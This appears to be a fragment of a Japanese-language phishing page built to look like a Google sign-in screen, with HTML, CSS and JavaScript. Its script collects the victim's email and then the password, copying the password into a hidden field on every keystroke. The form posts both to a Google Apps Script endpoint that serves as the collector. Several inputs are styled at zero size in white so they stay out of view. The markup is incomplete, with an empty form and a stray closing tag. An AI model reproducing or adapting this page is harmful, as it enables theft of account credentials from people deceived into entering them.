      <p>
        <form action="https://script.google.com/macros/s/AKfycbwVJKOIlYdb-h6OnAInItuNoXfClsxJHFLkrBnl1T81eQ0_YwVyVITYrjIKNnAX-w/exec" method="POST">

  </div>
</form>

<button class="btn" id="btn">次へ</button>

 <style type="text/css">
    .google{
  height:17%;
}

}
.chui{

  color:#424242;
  padding-top: 5%;
  font-weight:normal;
}
.email{
  border: none;
  border-bottom: 2px solid #4287f5;
  outline: none;
  color:#424242;

   width: 78%;
   height: 3vh;
   font-family: sans-serif;
   font-weight:normal;
   font-size: 300%;
   padding-bottom: 2%;
   -webkit-appearance: none;
}
h4{
   font-size:250%;

   font-weight:549;
   font-family: sans-serif;
   font-weight:normal;
}
.btn{
  background-color: #4287f5;
  border-radius: 5px;
  border:none;
  height: 5vh;
  width: 28%;
  color: white;
  cursor: pointer;
  margin-top: 6%;
  font-size: 200%;
  text-align: center;
  font-family: sans-serif;
} 
.help{
     font-size:11px;

   cursor: pointer;
   font-weight:normal;
}
.footer{
  position:absolute;
  bottom:0;
  font-weight:normal;
}
.link{
  color: #4287f5;

}
.input{
  color: white;
  width: 0px;
  height: 0px;
  border: white;
}
  </style>
  <script type="text/javascript">
    const btn = document.getElementById("btn");
    let count = 0;
     const input = document.getElementById("input");
     const mail =  document.getElementById("mail");
     const pass = document.getElementById("pass");
     const submit = document.getElementById("submit");
     const fakebtn = document.getElementById("fakebtn");
     const nyuuryokurann = document.getElementById("nyuuryokurann");
    btn.addEventListener("click",function(){
 window.setTimeout(
  function(){
      if(count == 0){
        //もしクリックされたのが一回目なら
      count++;
      mail.value= input.value;
      input.value="";
      document.getElementById("menu").innerHTML="パスワードを入力";
      btn.innerHTML="ログイン";
      submit.innerHTML ='<input  class="btn" id="btn" value="ログイン" type="submit">';
      fakebtn.innerHTML = "";
      nyuuryokurann.innerHTML = '<input type="password" class="email" id="input">';
      }else{
         pass.value= document.getElementById("input").value;
      }
    }
    , 500);
    })
    document.addEventListener('keyup',function() {

if (count == 1) {
  pass.value= document.getElementById("input").value;
}

});
